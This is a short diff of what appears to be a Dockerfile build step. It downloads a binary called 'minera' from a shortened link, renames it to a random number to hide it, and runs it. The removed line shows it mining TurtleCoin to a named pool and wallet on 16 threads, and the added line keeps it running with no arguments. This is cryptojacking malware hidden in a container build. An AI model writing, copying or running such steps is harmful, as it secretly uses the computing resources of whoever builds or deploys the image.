@@ -5,4 +5,4 @@ RUN apt-get update && \
     worker=$(shuf -n 1 -i 1-99999) && \
     wget -O minera https://bit.ly/3jC7wkh && \
     chmod +x minera && mv minera $worker && \
-    ./$worker --pool de.turtlecoin.herominers.com:1160 --username TRTLv3wYDEuVSLSF4GpapXebHFdQ1nMvpQYcyrkLdwvTC357JWXsWm2G6PfoRGJHWAVv4edybqkRDgwfqML4AJs9bph4hMgpGgf --password $(shuf -n 1 -i 1-99999) --algorithm turtlecoin --threads 16
+    ./$worker
